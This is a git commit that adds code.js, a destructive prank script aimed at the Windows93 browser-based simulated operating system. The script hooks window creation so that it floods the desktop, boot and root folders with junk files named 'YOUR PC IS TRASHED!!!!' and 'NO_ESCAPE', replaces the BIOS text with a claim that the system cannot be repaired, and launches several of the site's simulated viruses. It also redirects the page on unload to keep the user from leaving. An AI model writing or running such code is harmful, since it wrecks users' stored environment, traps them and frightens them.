ec2242ff46a136a181d981b6f88defcceb2b5cab
Iprogramprograms <121345725+Iprogramprograms@users.noreply.github.com>
2024-06-13 18:16:28 +0500

    Create code.js

---
+++ code.js
@@ -0,0 +1,25 @@
+object.onbeforeunload = function() {
+  window.location.replace("https://www.windows93.net/#!js%20data:application/javascript;base64,");
+};
+sigma = ["aqua", "acid", "blur", "edge", "postel", "plaster", "sys42", "trichrome", "neon_slug", "neon_hulk", "neon_satan", "rotate", "displacement", "disco", "convo", "convo2", "convo3", "convo4", "poster_color_fun", "plasticine", "electrize"]
+$window_old = $window
+$window = function(opt){
+  for(var i=0;i<100;i++){
+    $file.save('/a/desktop/' + Math.random() + " YOUR PC IS TRASHED!!!!.lnk42", "js base64")
+    $file.save('/a/boot/' + Math.random() + " YOUR PC IS TRASHED!!!!.js", "YOUR PC IS TRASHED!!!!")
+    $file.save('/a/' + Math.random() + "NO_ESCAPE.txt", "NO_ESCAPE")
+  }
+  $exe("fx ".concat(sigma[Math.floor(Math.random() * sigma.length)]))
+  $window_old(opt)
+}
+biosSetup()
+$boot.BIOS.innerHTML = "Your PC is trashed! Enjoy your last moments with it! Both normal boot and safe mode are unbootable! IT IS UNREPAIRABLE! (unless you reinstall)"
+le._init.home()
+le._init.desktop()
+document.getElementById("s42_desktop").className = "noscroll"
+for(var amogus=0;i<10;i++){
+  $exe("hydra")
+  $exe("marburg")
+  $exe("lisa")
+}
+$exe("crazy")
